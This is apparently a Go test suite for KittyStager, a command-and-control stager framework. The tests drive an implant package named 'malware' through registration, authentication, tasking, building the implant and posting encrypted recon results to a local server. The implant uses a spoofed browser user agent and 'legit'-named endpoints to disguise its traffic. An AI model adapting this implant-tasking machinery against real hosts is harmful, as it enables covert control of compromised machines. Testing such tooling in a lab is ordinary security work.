package test

import (
	"KittyStager/client/cli"
	"KittyStager/internal/config"
	"KittyStager/internal/crypto"
	"KittyStager/internal/task"
	"KittyStager/internal/task/recon"
	"KittyStager/kitten/malware"
	"KittyStager/server/api"
	"fmt"
	"github.com/go-playground/assert/v2"
	"os"
	"strings"
	"testing"
)

var (
	conf         *config.Config
	apiName      string
	apiPassword  string
	apiHost      string
	apiMalConfig *malware.Config
)

func init() {
	apiName = "test"
	apiPassword = "test"
	apiHost = "http://127.0.0.1:1337"
	var err error
	conf, err = config.NewConfig("config.yaml")
	go api.Api(conf)
	if err != nil {
		fmt.Println("[!] Error:", err)
		return
	}
	apiMalConfig = malware.NewConfig("http://127.0.0.1:8080", "getLegit", "postLegit", "reg", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/102.0", apiName, 1, 0)
}

func TestBackGetConf(t *testing.T) {
	getConfig, err := cli.GetConfig()
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	assert.Equal(t, conf, getConfig)
}

func TestBackGetLogs(t *testing.T) {
	_, err := cli.GetRequest(fmt.Sprintf("%s/test", fmt.Sprintf("%s://%s:%d", conf.GetProtocol(), conf.GetHost(), conf.GetPort())))
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	b, err := cli.GetRequest(fmt.Sprintf("%s/logs", apiHost))
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	if !strings.HasPrefix(string(b), "127.0.0.1") {
		t.Fail()
	}
}

func TestBackGetTask(t *testing.T) {
	malConfig := malware.NewConfig("http://127.0.0.1:8080", "getLegit", "postLegit", "reg", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/102.0", apiName, 1, 0)
	task1 := task.NewTask("test", []byte("test"))
	task2 := task.NewTask("sleep", []byte("2"))

	err := malware.DoPwreg(apiName, apiPassword, *malConfig)
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	// opaque auth
	_, err = malware.DoAuth(apiName, apiPassword, *malConfig)
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	err = cli.CreateTask(task2, apiName)
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	err = cli.CreateTask(task1, apiName)
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	getTask, err := cli.GetTask(apiName)
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	assert.Equal(t, task1, getTask[len(getTask)-1])
}

func TestBackBuild(t *testing.T) {
	err := os.Chdir("../")
	defer os.Chdir("./test")
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	err = cli.Build()
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	_, err = os.Stat("output/kitten.go")
	if err != nil {
		t.Errorf("Error: %s", err)
	}
}

func TestBackGetResult(t *testing.T) {
	malConfig := malware.NewConfig("http://127.0.0.1:8080", "getLegit", "postLegit", "reg", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/102.0", apiName, 1, 0)

	err := malware.DoPwreg(apiName, apiPassword, *malConfig)
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	// opaque auth
	_, err = malware.DoAuth(apiName, apiPassword, *malConfig)
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	b, err := cli.GetRequest(fmt.Sprintf("%s/result/%s", apiHost, apiName))
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	if string(b) != "null" {
		t.Fail()
	}
}

func TestFrontGetTask(t *testing.T) {
	malConfig := malware.NewConfig("http://127.0.0.1:8080", "getLegit", "postLegit", "reg", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/102.0", apiName, 1, 0)

	err := malware.DoPwreg(apiName, apiPassword, *malConfig)
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	// opaque auth
	key, err := malware.DoAuth(apiName, apiPassword, *malConfig)
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	getTask, err := malware.GetTask(*malConfig, key)
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	if getTask.Tag != "recon" {
		t.Fail()
	}
}

func TestFrontPostResult(t *testing.T) {
	err := malware.DoPwreg(apiName, apiPassword, *apiMalConfig)
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	// opaque auth
	key, err := malware.DoAuth(apiName, apiPassword, *apiMalConfig)
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	r := recon.NewRecon("test", "test", "test", "test", "test", "test", 0)
	b, err := r.MarshallRecon()
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	ta := task.NewTask("recon", b)
	tm, err := ta.MarshallTask()
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	c := crypto.NewChaCha20()
	e, err := c.Encrypt(tm, []byte(key))
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	request, err := malware.PostRequest(e, apiMalConfig.PostEndpoint, *apiMalConfig)
	if err != nil {
		t.Errorf("Error: %s", err)
	}
	if string(request) != "" {
		t.Fail()
	}
}
